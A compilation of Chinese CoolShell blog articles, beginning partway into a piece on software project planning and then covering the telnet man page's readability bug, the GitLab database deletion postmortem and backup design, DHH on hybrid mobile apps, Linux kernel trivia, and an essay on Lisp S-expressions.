这就好像我们修路造桥一样，我们需要花大量的时间勘测地形地质，分析数据，思考可能出现的各种问题（各种自然灾害），评估不同的设计方案，而不是先尽快建好再说。所以， **多一些时间，不是让你多做几次迭代，多完成几个模块，而是可以让你少写一些代码，更快的交付一个更好的产品** 。我相信你会有很多疑问，下面是我觉得你可能会有下面的一些观点，让我一条一条来回复：* **首当其冲的一定会是项目的deadline，或是那种你没有活语权的项目。** 比如做那种“甲乙方合同式的项目”，我把这种项目统一认为是“外包项目”，在这种项目性质下，你很难有话语权。对此，我觉得，1）作为乙方的你还是应该和甲方在项目计划上争取一下，晓之以情，动之以理。2）如果不行，只能在时间、需求范围和质量上做一个权衡。另外， **在这种情况下你要找一个方法，把你的压力和痛苦分担给用户和领导。** （找到这个方法的前提需要你找到用户和领导他们害怕什么，嘿嘿）* **过度设计和纸上谈兵** 。有人说会不会设计太多，造成过度设计，或是在设计上花太多的时间。这有可能。我上一家公司的一个项目团队就花了1年多的时间来不停不停的开会和做设计，结果release的时候还有1000多个bug。这个问题的原因是，这个团队的设计是在纸上谈兵，开会是开神仙会，讨论的设计都是浮云。所以， **设计并不是讨论和思考，还需要去尝试，** 我认为当你的设计完成的时候，你的骨干核心代码都基本完成了。
* **我的团队成员水平太差，不会思考** 。首先，先恭喜你找到一堆码农，当然，这不怪你，这是中国教育和大环境的问题，让人不会思考。对于这样的情况，我有两个建议，1）量力而行，使多大的碗就吃多少饭。2）鼓励思考，那怕那些想法很不靠谱，因为如果不开始，那么将永远不会思考。* **必需使用快速迭代** 。很多公司都在强行上敏捷，他们希望产品越快release越好，而没有充分的时间思考和讨论。对于这种项目，我的建议是，1）找有丰富经验的人来做。2）迭代过程中力求架构和程序逻辑的简单，简单，再简单，力求代码间的高内聚，低耦合。不然，重构的时候你就好玩了。* **创业团队必需要快** 。做得快就是做得好吗？很多时候，不是谁快谁就能笑到最后的。这样的例子太多了。第一个做出来的人并不一定就会占领市场，其很有可能会成为先驱。* **有钱的公司才会让团队用更多的时间去思考** 。错了，你们没有见过有钱的公司，有钱的公司可以招一堆干不成活的人，可以把事搞乱了再新来过，甚至可以把做失败的项目换个名字再重新立项。这些真正的有钱的公司只求快，只求人多，不怕做错决定。像我们这些没钱的人，干什么事都是小心翼翼地，生怕做错决定。
关于软件项目管理的文章，还可以参看《软件公司的两种管理方式》，最后，欢迎大家表达观点。（全文完）# telnet的一个Bug作者：陈皓，左耳朵耗子来自：酷壳网 CoolShell https://coolshell.cn下面这个链接是Linux分发包Ubuntu的关于Telnet命令的Man Page，打开这个Man Page，把页面拉到最后一行，你会看到下面这个BUG（“BUGS：源代码不易读！”）The source code is not comprehensible.Telnet的源代码在这里：，下载下来一看，还真是不易读，简单地看了一下代码，发现至少有这样一些问题：* 空格和Tab键混用的缩进，导致很多代码在没有缩进。   * 大量的#if #else以及大量的各种预编译宏。以及一些怪异的宏。如：#ifndef B19200   #define B19200 B9600   #endif#ifndef B38400   #define B38400 B19200   #endif* 什么叫在C中写C++，第一次见。（在terminal.cc中间居然出现了几个class）   * 变量命名很不直观，大量的old, tmp, c1, c2, s1, s2, s3 等学校里用的变量名，只有作者自己知道是什么意思。函数命令的风格也不一致，编程风格也很不一致，基本没有编程规范。
的确很不易读。不管怎么样，很欣赏在man page中把源码的易读性列为BUG的这种作法。# 从Gitlab误删除数据库想到的作者：陈皓，左耳朵耗子来自：酷壳网 CoolShell https://coolshell.cn昨天，Gitlab.com发生了一个大事，某同学误删了数据库，这个事看似是个低级错误，不过，因为Gitlab把整个过程的细节都全部暴露出来了，所以，可以看到很多东西，而对于类似这样的事情，我自己以前也干过，而在最近的两公司中我也见过（Amazon中见过一次，阿里中见过至少四次），正好通过这个事来说说一下自己的一些感想和观点吧。 **我先放个观点：你觉得有备份系统就不会丢数据了吗？**目录* 事件回顾   * 相关的思考     * 技术方面   * 关于备份     * 非技术方面#### 事件回顾整个事件的回顾Gitlab.com在第一时间就放到了Google Doc上，事后，又发了一篇Blog来说明这个事，在这里，我简单的回顾一下这个事件的过程。首先，一个叫YP的同学在给gitlab的线上数据库做一些负载均衡的工作，在做这个工作时的时候突发了一个情况，Gitlab被DDoS攻击，数据库的使用飙高，在block完攻击者的IP后，发现有个staging的数据库(db2.staging)已经落后生产库4GB的数据，于是YP同学在Fix这个staging库的同步问题的时候，发现db2.staging有各种问题都和主库无法同步，在这个时候，YP同学已经工作的很晚了，在尝试过多个方法后，发现db2.staging都hang在那里，无法同步，于是他想把db2.staging的数据库删除了，这样全新启动一个新的复制，结果呢，删除数据库的命令错误的敲在了生产环境上（db1.cluster），结果导致整个生产数据库被误删除。（ **陈皓注：这个失败基本上就是 “工作时间过长” + “在多数终端窗口中切换中迷失掉了”** ）
在恢复的过程中，他们发现只有db1.staging的数据库可以用于恢复，而其它的5种备份机制都不可用，第一个是数据库的同步，没有同步webhook，第二个是对硬盘的快照，没有对数据库做，第三个是用pg_dump的备份，发现版本不对（用9.2的版本去dump 9.6的数据）导致没有dump出数据，第四个S3的备份，完全没有备份上，第五个是相关的备份流程是问题百出的，只有几个粗糙的人肉的脚本和糟糕的文档，也就是说，不但是是人肉的，而且还是完全不可执行的。（ **陈皓注：就算是这些备份机制都work，其实也有问题，因为这些备份大多数基本上都是24小时干一次，所以，要从这些备份恢复也一定是是要丢数据的了，只有第一个数据库同步才会实时一些** ）最终，gitlab从db1.staging上把6个小时前的数据copy回来，结果发现速度非常的慢，备份结点只有60Mbits/S，拷了很长时间（ **陈皓注：为什么不把db1.staging给直接变成生产机？因为那台机器的性能很差** ）。数据现在的恢复了，不过，因为恢复的数据是6小时前的，所以，有如下的数据丢失掉了：* 粗略估计，有4613 的项目， 74 forks, 和 350 imports 丢失了；但是，因为Git仓库还在，所以，可以从Git仓库反向推导数据库中的数据，但是，项目中的issues等就完全丢失了。   * 大约有±4979 提交记录丢失了（陈皓注：估计也可以用git仓库中反向恢复）。   * 可能有 707 用户丢失了，这个数据来自Kibana的日志。   * 在1月31日17:20 后的Webhooks 丢失了。
因为Gitlab把整个事件的细节公开了出来，所以，也得到了很多外部的帮助，2nd Quadrant的CTO – Simon Riggs 在他的blog上也发布文章 Dataloss at Gitlab 给了一些非常不错的建议：* 关于PostgreSQL 9.6的数据同步hang住的问题，可能有一些Bug，正在fix中。   * PostgreSQL有4GB的同步滞后是正常的，这不是什么问题。   * 正常的停止从结点，会让主结点自动释放WALSender的链接数，所以，不应该重新配置主结点的 max_wal_senders 参数。但是，停止从结点时，主结点的复数连接数不会很快的被释放，而新启动的从结点又会消耗更多的链接数。他认为，Gitlab配置的32个链接数太高了，通常来说，2到4个就足够了。   * 另外，之前gitlab配置的max_connections=8000太高了，现在降到2000个是合理的。   * pg_basebackup 会先在主结点上建一个checkpoint，然后再开始同步，这个过程大约需要4分钟。   * 手动的删除数据库目录是非常危险的操作，这个事应该交给程序来做。推荐使用刚release 的 repmgr   * 恢复备份也是非常重要的，所以，也应该用相应的程序来做。推荐使用 barman （其支持S3）   * 测试备份和恢复是一个很重要的过程。
看这个样子，估计也有一定的原因是——Gitlab的同学对PostgreSQL不是很熟悉。随后，Gitlab在其网站上也开了一系列的issues，其issues列表在这里 Write post- mortem (这个列表可能还会在不断更新中)* infrastructure#1094 – Update PS1 across all hosts to more clearly differentiate between hosts and environments   * infrastructure#1095 – Prometheus monitoring for backups   * infrastructure#1096 – Set PostgreSQL’s max_connections to a sane value   * infrastructure#1097 – Investigate Point in time recovery & continuous archiving for PostgreSQL   * infrastructure#1098 – Hourly LVM snapshots of the production databases   * infrastructure#1099 – Azure disk snapshots of production databases   * infrastructure#1100 – Move staging to the ARM environment   * infrastructure#1101 – Recover production replica(s)   * infrastructure#1102 – Automated testing of recovering PostgreSQL database backups   * infrastructure#1103 – Improve PostgreSQL replication documentation/runbooks   * infrastructure#1104 – Kick out SSH users inactive for N minutes   * infrastructure#1105 – Investigate pgbarman for creating PostgreSQL backups
从上面的这个列表中，我们可以看到一些改进措施了。挺好的，不过我觉得还不是很够。#### 相关的思考因为类似这样的事，我以前也干过（误删除过数据库，在多个终端窗口中迷失掉了自己所操作的机器……），而且我在amazon里也见过一次，在阿里内至少见过四次以上（在阿里人肉运维的误操作的事故是我见过最多的），但是我无法在这里公开分享，私下可以分享。在这里，我只想从非技术和技术两个方面分享一下我的经验和认识。##### 技术方面**人肉运维**一直以来，我都觉得直接到生产线上敲命令是一种非常不好的习惯。我认为， **一个公司的运维能力的强弱和你上线上环境敲命令是有关的，你越是喜欢上线敲命令你的运维能力就越弱，越是通过自动化来处理问题，你的运维能力就越强** 。理由如下：其一，如果说对代码的改动都是一次发布的话，那么，对生产环境的任何改动（包括硬件、操作系统、网络、软件配置……），也都算是一次发布。那么这样的发布就应该走发布系统和发布流程，要被很好的测试、上线和回滚计划。关键是，走发布过程是可以被记录、追踪和回溯的，而在线上敲命令是完全无法追踪的。没人知道你敲了什么命令。其二，真正良性的运维能力是——人管代码，代码管机器，而不是人管机器。你敲了什么命令没人知道，但是你写个工具做变更线上系统，这个工具干了什么事，看看工具的源码就知道了。
另外、有人说，以后不要用rm了，要用mv，还有人说，以后干这样的事时，一个人干，另一个人在旁边看，还有人说，要有一个checklist的强制流程做线上的变更，还有人说要增加一个权限系统。我觉得，这些虽然可以work，但是依然不好，再由如下：其一、如果要解决一个事情需要加更多的人来做的事，那这事就做成劳动密集型了。今天我们的科技就是在努力消除人力成本，而不是在增加人力成本。而做为一个技术人员，解决问题的最好方式是努力使用技术手段，而不是使用更多的人肉手段。 **人类区别于动物的差别就是会发明和使用现代化的工具，而不是使用更多的人力** 。另外， **这不仅仅因为是，人都是会有这样或那样的问题（疲惫、情绪化、急燥、冲动……），而机器是单一无脑不知疲惫的，更是因为，机器干活的效率和速度是比人肉高出N多倍的** 。其二、增加一个权限系统或是别的一个watch dog的系统完全是在开倒车，权限系统中的权限谁来维护和审批？不仅仅是因为多出来的系统需要多出来的维护，关键是这个事就没有把问题解决在root上。除了为社会解决就业问题，别无好处，故障依然会发生，有权限的人一样会误操作。对于Gitlab这个问题，正如2nd Quadrant的CTO建议的那样，你需要的是一个自动化的备份和恢复的工具，而不是一个权限系统。
其三、像使用mv而不rm，搞一个checklist和一个更重的流程，更糟糕。这里的逻辑很简单，因为，1）这些规则需要人去学习和记忆，本质上来说，你本来就不相信人，所以你搞出了一些规则和流程，而这些规则和流程的执行，又依赖于人，换汤不换药，2）另外， **写在纸面上的东西都是不可执行的，可以执行的就是只有程序，所以，为什么不把checklist和流程写成代码呢** ？（你可能会说程序也会犯错，是的，程序的错误是consistent，而人的错误是inconsistent）最关键的是， **数据丢失有各种各样的情况，不单单只是人员的误操作，比如，掉电、磁盘损坏、中病毒等等，在这些情况下，你设计的那些想流程、规则、人肉检查、权限系统、checklist等等统统都不管用了，这个时候，你觉得应该怎么做呢？是的，你会发现，你不得不用更好的技术去设计出一个高可用的系统！别无它法。**#### 关于备份一个系统是需要做数据备份的，但是，你会发现， **Gitlab这个事中，就算所有的备份都可用，也不可避免地会有数据的丢失，或是也会有很多问题** 。理由如下：1）备份通常来说都是周期性的，所以，如果你的数据丢失了，从你最近的备份恢复数据里，从备份时间到故障时间的数据都丢失了。
2）备份的数据会有版本不兼容的问题。比如，在你上次备份数据到故障期间，你对数据的scheme做了一次改动，或是你对数据做了一些调整，那么，你备份的数据就会和你线上的程序出现不兼容的情况。3）有一些公司或是银行有灾备的数据中心，但是灾备的数据中心没有一天live过。等真正灾难来临需要live的时候，你就会发现，各种问题让你live不起来。你可以读一读几年前的这篇报道好好感受一下《以史为鉴 宁夏银行7月系统瘫痪最新解析》所以，在灾难来临的时候，你会发现你所设计精良的“备份系统”或是“灾备系统”就算是平时可以工作，但也会导致数据丢失，而且可能长期不用的备份系统很难恢复（比如应用、工具、数据的版本不兼容等问题）。我之前写过一篇《分布式系统的事务处理》，你还记得下面这张图吗？看看 Data Loss 那一行的，在Backups, Master/Slave 和 Master/Master的架构下，都是会丢的。所以说， **如果你要让你的备份系统随时都可以用，那么你就要让它随时都Live着** ，而随时都Live着的多结点系统，基本上就是一个分布式的高可用的系统。因为 **，数据丢失的原因有很多种，比如掉电、磁盘损坏、中病毒等等，而那些流程、规则、人肉检查、权限系统、checklist等等都只是让人不要误操作，都不管用，这个时候，你不得不用更好的技术去设计出一个高可用的系统！别无它法。（重要的事，得再说一篇）**
另外，你可以参看我的另一篇《关于高可用系统》，这篇文章中以MySQL为例，数据库的replication也只能达到 两个9。**AWS 的 S3 的的高可用是4个加11个9的持久性（** 所谓11个9的持久性durability，AWS是这样定义的，如果你存了1万个对象，那么丢一个的时间是1000万年 **），这意味着，不仅仅只是硬盘坏，机器掉电，整个机房挂了，其保证可以承受有两个设施的数据丢失，数据还是可用的。试想，如果你把数据的可用性通过技术做到了这个份上，那么，你还怕被人误删一个结点上的数据吗？**##### 非技术方面**故障反思**一般说来，故障都需要反思，在Amazon，S2以上的故障都需要写COE（Correction of Errors），其中一节就是需要Ask 5 Whys，我发现在Gitlab的故障回顾的blog中第一段中也有说要在今天写个Ask 5 Whys。关于Ask 5 Whys，其实并不是亚马逊的玩法，这还是算一个业内常用的玩法，也就是说不断的为自己为为什么，直到找到问题的概本原因，这会逼着所有的当事人去学习和深究很多东西。在Wikipedia上有相关的词条 5 Whys，其中罗列了14条规则：
1. 你需要找到正确的团队来完成这个故障反思。   2. 使用纸或白板而不是电脑。   3. 写下整个问题的过程，确保每个人都能看懂。   4. 区别原因和症状。   5. 特别注意因果关系。   6. 说明Root Cause以及相关的证据。   7. 5个为什么的答案需要是精确的。   8. 寻找问题根源的步骤，而不是直接跳到结论。   9. 要基础客观的事实、数据和知识。   10. 评估过程而不是人。   11. 千万不要把“人为失误”或是“工作不注意”当成问题的根源。   12. 培养信任和真诚的气氛和文化。   13. 不断的问“为什么”直到问题的根源被找到。这样可以保证同一个坑不会掉进去两次。   14. 当你给出“为什么”的答案时，你应该从用户的角度来回答。**工程师文化**上述的这些观点，其实，我在我的以住的博客中都讲过很多遍了，你可以参看《什么是工程师文化？》以及《开发团队的效率》。其实，说白了就是这么一个事—— **如果你是一个技术公司，你就会更多的相信技术而不是管理。相信技术会用技术来解决问题，相信管理，那就只会有制度、流程和价值观来解决问题** 。这个道理很简单， **数据丢失有各种各样的情况，不单单只是人员的误操作，比如，掉电、磁盘损坏、中病毒等等，在这些情况下，你设计的那些流程、规则、人肉检查、权限系统、checklist等等统统都不管用，这个时候，你觉得应该怎么做呢？是的，你会发现，你不得不用更好的技术去设计出一个高可用的系统！别无它法。（重要的事得说三遍）**
**事件公开**很多公司基本上都是这样的套路，首先是极力掩盖，如果掩盖不了了就开始撒谎，撒不了谎了，就“文过饰非”、“避重就轻”、“转移视线”。然而，面对危机的最佳方法就是——“多一些真诚，少一些套路”， **所谓的“多一些真诚”的最佳实践就是——“透明公开所有的信息”** ，Gitlab此次的这个事给大家树立了非常好的榜样。AWS也会把自己所有的故障和细节都批露出来。**事情本来就做错了，而公开所有的细节，会让大众少很多猜测的空间，有利于抵制流言和黑公关，同时，还会赢得大众的理解和支持** 。看看Gitlab这次还去YouTube上直播整个修复过程，是件很了不起的事，大家可以到他们的blog上看看，对于这样的透明和公开，一片好评。（全文完）# DHH 谈混合移动应用开发作者：陈皓，左耳朵耗子来自：酷壳网 CoolShell https://coolshell.cn!1053-DHHDavid，Ruby on Rails 作者，37signals 合伙人畅销书作家、演说家、赛车手、业余摄影师、顾家好男人37signals 在2013年2月发布了 Basecamp 的 iPhone app，在此之前我们就使用原生开发（native）还是混合开发（hybrid）做了许多尝试。在2012年项目启动的时候，大多数人都倾向于原生开发。
Facebook 在2012年发布了他们新的 iOS app，为了获得更好的用户体验，他们放弃了原来的 HTML5 混合开发方式。考虑到2010～2011年的时候，HTML 在移动端的性能确实不尽如人意，这个决定在当时看来也在情理之中。2010年的时候我们觉得 iPhone 3G/3GS 够眩够快，但按照现在的标准来看它们就太慢了。因此在为移动应用开发做架构设计时，我们需要考虑新的移动设备的计算能力，而不是那些老的过时的设备。目录* 移动开发架构设计不需要过多考虑设备的性能   * 第一代产品：原生外壳(native shell)＋嵌套WebView   * 第二代产品：原生外壳＋原生导航界面   * 因地制宜地运用原生开发方式   * 混合开发模式使用的技术   * 混合开发模式对原生开发模式的挑战#### 移动开发架构设计不需要过多考虑设备的性能我们从一些测试中得出的一个结论是：现在的移动设备计算能力都很强，运行原生应用和 HTML 应用的效果差别不大，而 HTML 开发的成本则要比原生开发小得多。当然这个结论在某些领域并不太适用。如果你要开发一个 3D 游戏，原生开发方式能够带来更好的游戏体验。但如果你的移动应用象 Basecamp 一样侧重信息处理，为了降低开发成本，你就可以考虑混合开发方式。我们就是如此，下面是我们三代移动产品的发展轨迹：
#### 第一代产品：原生外壳(native shell)＋嵌套WebView!1159-basecamp-app-phones这个版本就是一个简单的原生外壳负责界面导航，嵌套一个 WebView 来显示 Basecamp Rail application，显示的基本上都是我们移动网站页面，再加上一些特殊的样式。在移动网站的页面上嵌套一个原生的壳，听起来还是 Web 页面，但实际带给用户的体验确是非常不同。用户可以在 Apple App Store 找到我们的 app，他们一旦登录 app 后可以再也不用重新登录（移动版本的 Safari 似乎会经常清空 cookie，让你不得不重新登录）。我们的 app 大受欢迎，用户评分在4和5之间。整个 app 由一名程序员和一名设计师开发，成本不高，因为我们可以在已有的移动网站的基础上开发。如果我们当初开发完全原生的 app，用10个人的团队1年半的时间也未必能完成。#### 第二代产品：原生外壳＋原生导航界面!1543-unnamed几个月前发布的 Basecamp Android app 是我们的第二代产品，我们在其中做了大量的改进。从第一代 iPhone app 中我们感受到了原生导航界面的威力，所以在 Android 版本中，我们由 HTML 页面导航转向了原生导航界面。我们从 HTML 页面生成原生导航界面，用户体验更加流畅，原生界面和 HTML 页面的体验差别越来越小，甚至很难区分哪些是原生部分，哪些是 HTML 。
Android 版本是由一两个程序员和一个设计师开发（50%投入）完成的。我们重用了移动站点和 iPhone app 中使用的所有 webview，大大提高了开发效率，同时用户也很买账，超过1000名用户打了4.5~5的高分。很多公司在抱怨他们的 iOS 移动项目进展缓慢，Android 项目似乎更是如此。或许他们已经习惯了 iOS 项目的开发流程，也许是因为 Android 的屏幕碎片化问题，但是这些对我们来说那都不是事。我们推出的 Android app 表现良好，重用了95%的代码，开发团队也一直保持在小规模。#### 因地制宜地运用原生开发方式目前我们正在开发第三代产品，发布的平台暂时保密，不过你应该也不难猜到。在前两代产品中，我们增加了原生导航界面的使用，同时进一步确定了以 webview 为核心的整体架构。在第三代产品中，我们将因地制宜地选择需要使用原生开发的功能，好钢要用在刀刃上。从之前的100% HTML，到现在的90% HTML +10%原生，我们会选择最值得做原生开发的那10%的部分，最终目的是让 app 原生部分和 HTML 部分的体验没有太大区别。#### 混合开发模式使用的技术
混合开发模式在技术很简单，主要是处理 webview 的集成、Web 页面的加载，以及原生内容和 HTML 内容之间的交叉链接，其实可能比你想像的还要简单得多。HTML 方面，我们的 Rails Web 应用支持 Web 和移动两大平台，其中 Rails 4.1 feature of variants 起了很大的作用。这也很大程度上有助于我们发布新功能。设想一下如果我们每次需要更新这么多平台：Rails desktop app, a Rails API app, a client-side MVC app, a mobile web wrapper app, an Android app, and an iPhone app，像我们这样只有10个程序员和7个设计师的公司根本无力承担如此巨大的工作量。除了工作量的减轻，bug 修复效率也提高了，因为大部分的代码逻辑是在 Web 服务器端，我们可以随时修改代码并发布，不用通过 Apple App Store 的审批流程。所以我们的移动 app 和 Web 应用一样，也是持续部署。就如我之前提到的，混合模式开发并不适用于所有情况。在2010年以前，那时手机的处理能力都不强，所以 HTML/JS 的体验并不好，用户也不喜欢。但是时过境迁，现在手机的处理能力大大提高了，HTML/JS 的性能也不再是一个问题。
#### 混合开发模式对原生开发模式的挑战混合开发模式在降低开发复杂度方面有它的优势，如果你的产品是以显示和处理信息为主，我认为都可以不同程度地采用这个模式。对于小型团队和公司而言，并不一定需要采用 iOS 原生 app 先行的模式。使用混合模式，不需要你重头开发一个 app，这样可以降低维护成本，将来扩展到其他平台也更为方便。当然我知道会有很多人质疑这个模式，或许因为他们的 app 中有很多地方需要原生开发（也许仅仅是他们自己这样认为罢了）。又或许他们已经花了很多时间让 app 里的 UITableView 看起来非常漂亮，以致如果其他地方不这样的话显得不是太完美。再或许大公司就是喜欢耗时耗力的原生开发，有钱就是这么任性。无论怎样，混合开发当下应该能够成为我们移动开发策略的一个选择。如果你认为这是一个好的选择，那么恭喜你，尽情愉快地玩耍吧！_原文链接：Hybrid sweet spot: Native navigation, web content_下面补充一些 David 答读者问：Mike Waite @ 2014-05-08：我很好奇你是如何决定哪些功能要用原生开发？   David @ 2014-05-08：主要靠感觉，这毕竟不是一门科学。如果你感觉你app的某一部分如果用原生开发会更好些，可以尝试做快速原型（spike）。很多时候我们通过这种方式证明我们的想法其实是错的。当然如果你需要使用到手机上的功能如：摄像和其他设备时，HTML目前还不太适用，不过永远也不要把话说死。
Mike Parsons @ 2014-05-08：好文。很好奇你们是否使用 PhoneGap 或者 Cordova 这样的框架，或者你们自己开发了一个？   David @ 2014-05-08：我们没有使用任何框架。（此处省去xxx字）Derick @ 2014-05-08：你怎样解决 Android 浏览器渲染速度慢的问题？这也是 Android 平台上更多人倾向开发原生app得原因。   David @ 2014-05-08：不知道你这个结论是近期的还是以前的？Basecamp 的 Android app 在我的 Nexus 5 和 HTC One 上面运行得非常流畅。   Derick @ 2014-05-08：就是最近。我猜测可能和你使用JavaScript的多少有关系。因为以我个人的经验，Android 上 JavaScript 的运行速度非常慢。如果你感兴趣可以看看下面的文章：   David @ 2014-05-08：我们使用了很多JavaScript，当然没有 Web MVC 客户端用得那样多。另外我们使用了 Turbolinks ：）*[W3C]: World Wide Web Consortium   *[VML]: Vector Markup Language
# Linux的15岁生日作者：陈皓，左耳朵耗子来自：酷壳网 CoolShell https://coolshell.cn今年是Linux的15生日，15年前，1994年3月， Linux kernel 版本1.0.0 released。这几天，全世界很多站点都在发布Blog庆祝Linux的15岁生日，而这篇文章是其中的一篇关于 Linux kernel 的，如果你是Linux的粉丝，希望你能喜欢。!mask-linus_torvalds1\. Linux是由一个芬兰的仅有21岁的大学生因为兴趣而产生的。2\. 为表扬他的突出贡献，有一颗小行星以他的名字命名。http://en.wikipedia.org/wiki/9793_Torvalds。3\. 有上千个开发人员和程序员从世界的各个角落汇聚在一起，他们不停地开发Linux Kernel。4\. Linux kernel的官方吉祥物是一只小企鹅，叫做Tux.5\. 欧盟研究基金调查表明，Linux最新内核的评估价格在1.14亿美金。6\. 今天，Linux内核中只有2%的程序由 Linus Torvalds开发。7\. Linux内核是由C语语开发。
8\. 今天Linux 是一个移值最广泛的操作系统内核，他可以运行在许多不同范围的系统上，包括PC，大型主机，嵌入式等等。9\. Linux kernel 版本1.0.0 一共有 176,250 行代码，而最新的 Linux kernel 有超过一千万行代码。下面是版本2的代码行列表。* 1999年1月25日 – Linux 2.2.0 was released (1,800,847 代码行). * 2001年1月4日 – Linux 2.4.0 was released (3,377,902 代码行). * 2003年12月17日 – Linux 2.6.0 was released (5,929,913 代码行). * 2008年12月24日 – Linux 2.6.28 was released (10,195,402 代码行).10. 使用一个软件，你可以让Microsoft Windows 和Linux kernel 可以同时的运行在同一台机器上，这个软件叫 Cooperative Linux (coLinux).11\. 起初, Torvalds 想把这个内核叫做Freax (这个单词合并了 “free”和”freak”，并且使用 X 字母来表明这是一个 Unix- like 的东西)，但他的一个朋友Ari Lemmke，这是一个FTP的管理员，在第一次把Linux的内核放在FTP上供人下载时，他把这个目录命名成了 linux。
12\. 一个叫William Della Croce的人注册了Linux商标，但最终他同意把这个商标还给了 Torvalds。13\. 今天，全世界500个超级计算机中有超过87%的系统使用了Linux内核。14\. 术语”vanilla kernel” 不是一种冰激凌，而是一个未更改过的Linux内核。15\. 目前的Linux内核使用了如下技术： 真正的抢先式多任务 ( 用户模式 and 内核模式)， 虚拟内存, 动态链接库")，demand loading, 共享式的写时拷贝 , 内存管理, Internet 协议包, 和 线程").# Lisp的永恒之道作者：陈皓，左耳朵耗子来自：酷壳网 CoolShell https://coolshell.cn【感谢 Todd投递本文 – 微博帐号：weidagang 】目录* Lisp之魅   * Lisp之源   * Lisp之形   * Lisp之道   * Lisp之器   * 总结   * 后记   * 参考#### Lisp之魅长久以来，Lisp一直被许多人视为史上最非凡的编程语言。它不仅在50多年前诞生的时候带来了诸多革命性的创新并极大地影响了后来编程语言的发展，即使在一大批现代语言不断涌现的今天，Lisp的诸多特性仍然未被超越。当各式各样的编程语言摆在面前，我们可以从运行效率、学习曲线、社区活跃度、厂商支持等多种不同的角度进行评判和选择，但我特别看中的一点在于语言能否有效地表达编程者的设计思想。学习C意味着学习如何用过程来表达设计思想，学习Java意味着学习如何用对象来表达设计思想，而虽然Lisp与函数式编程有很大的关系，但学习Lisp绝不仅仅是学习如何用函数表达设计思想。实际上， **函数式编程并非Lisp的本质** ，在已经掌握了lambda、高阶函数、闭包、惰性求值等函数式编程概念之后，学习Lisp仍然大大加深了我对编程的理解。 **学习Lisp所收获的是如何“自由地”表达你的思想** ，这正是Lisp最大的魅力所在，也是这门古老的语言仍然具有很强的生命力的根本原因。
#### Lisp之源Lisp意为表处理(List Processing)，源自设计者John McCarthy于1960年发表的一篇论文《符号表达式的递归函数及其机器计算》。McCarthy在这篇论文中向我们展示了用一种简单的数据结构S表达式(S-expression)来表示代码和数据，并在此基础上构建一种完整的语言。Lisp语言形式简单、内涵深刻，Paul Graham在《Lisp之根源》中将其对编程的贡献与欧几里德对几何的贡献相提并论。#### Lisp之形然而，与数学世界中简单易懂的欧氏几何形成鲜明对比，程序世界中的Lisp却一直是一种古老而又神秘的存在，真正理解其精妙的人还是少数。从表面上看，Lisp最明显的特征是它“古怪”的S表达式语法。S表达式是一个原子(atom)，或者若干S表达式组成的列表(list)，表达式之间用空格分开，放入一对括号中。“列表“这个术语可能会容易让人联想到数据结构中的链表之类的线形结构，实际上，Lisp的列表是一种可嵌套的树形结构。下面是一些S表达式的例子:foo()(a b (c d) e)(+ (* 2 3) 5)(defun factorial (N)     (if (= N 1)     1     (* N (factorial (- N 1)))     )     )
据说，这个古怪的S表达式是McCarthy在发明Lisp时候所采用的一种临时语法，他实际上是准备为Lisp加上一种被称为M表达式(M-expression)的语法，然后再把M表达式编译为S表达式。用一个通俗的类比，S表达式相当于是JVM的字节码，而M表达式相当于Java语言，但是后来Lisp的使用者都熟悉并喜欢上了直接用S表达式编写程序，并且他们发现S表达式有许多独特的优点，所以M表达式的引入也就被无限期延迟了。许多Lisp的入门文章都比较强调Lisp的函数式特性，而我认为这是一种误导。真正的Lisp之门不在函数式编程，而在S表达式本身，Lisp最大的奥秘就藏在S表达式后面。S表达式是Lisp的语法基础，语法是语义的载体，形式是实质的寄托。 **“S表达式”是程序的一种形，正如“七言”是诗的一种形，“微博”是信息的一种形** 。正是形的不同，让微博与博客有了质的差异，同样的道理，正是S表达式让Lisp与C、Java、SQL等语言有了天壤之别。#### Lisp之道一门语言能否有效地表达编程者的设计思想取决于其抽象机制的语义表达能力。根据抽象机制的不同，语言的抽象机制形成了面向过程、面向对象、函数式、并发式等不同的范式。当你采用某一种语言，基本上就表示你已经“面向XXX“了，你的思维方式和解决问题的手段就会依赖于语言所提供的抽象方式。比如，采用Java语言通常意味着采用面向对象分析设计；采用Erlang通常意味着按Actor模型对并发任务进行建模。
有经验的程序员都知道，无论是面向XXX编程，程序设计都有一条“抽象原则“：What与How解耦。但是， **普通语言的问题就在于表达What的手段非常有限** ，无非是过程、类、接口、函数等几种方式，而诸多领域问题是无法直接抽象为函数或接口的。比如，你完全可以在C语言中定义若干函数来做到make file所做的事情，但C代码很难像make file那样声明式地体现出target、depends等语义，它们只会作为实现细节被淹没在一个个的C函数之中。采用OOP或是FP等其它范式也会遇到同样的困难，也就是说make file语言所代表的抽象维度与面向过程、OOP以及FP的抽象维度是正交的，使得各种范式无法直接表达出make file的语义。这就是普通语言的“刚性”特征，它要求我们必须以语言的抽象维度去分析和解决问题，把问题映射到语言的基本语法和语义。更进一步，如果仔细探究这种刚性的根源，我们会发现正是由于普通语言 **语法和语义的紧耦合** 造成了这种刚性。比如，C语言中printf(“hello %s”, name)符合函数调用语法，它表达了函数调用语义，除此之外别无他义；Java中interface IRunnable { … }符合接口定义语法，它表达了接口定义语义，除此之外别无他义。如果你认为“语法和语义紧耦合“是理所当然的，看不出这有什么问题，那么理解Lisp就会让你对此产生更深的认识。
当你看到Lisp的(f a (b c))的时候，你会想到什么？会不会马上联想到函数求值或是宏扩展？就像在C语言里看到gcd(10, 15)马上想到函数调用，或者在Java里看到class A马上想到类定义一样。如果真是这样，那它就是你理解Lisp的一道障碍，因为你已经习惯了顺着语言去思考，总是在想这一句话机器怎么解释执行？那一句话又对应语言的哪个特性？理解Lisp要反过来，让语言顺着你，Lisp的(f a (b c))可以是任何语义，完全由你来定，它可以是函数定义、类定义、数据库查询、文件依赖关系，异步任务的执行关系，业务规则 …下面我准备先通过几个具体的例子逐步展示Lisp的本质。需要说明的是，由于Lisp的S表达式和XML的语法形式都是一种树形结构，在语义表达方面二者并无本质的差别。所以，为了理解方便，下面我暂且用多数人更为熟悉的XML来写代码，请记住我们可以很轻易地把XML代码和Lisp代码相互转换。首先，我们可以轻易地用XML来定义一个求两个数最大公约数的函数：<func name='gcd' return_type='int'>     <params>     <a type='int'/>     <b type='int'/>     </params>     <body>     <if>     <equals>     <a/>     <int>0</int>     </equals>     </if>     <then>     <return><b/></return>     </then>     <else>     <return>     <gcd>     <modulo><b/><a/></modulo>     <a/>     </gcd>     </return>     </else>     </body>     </func>
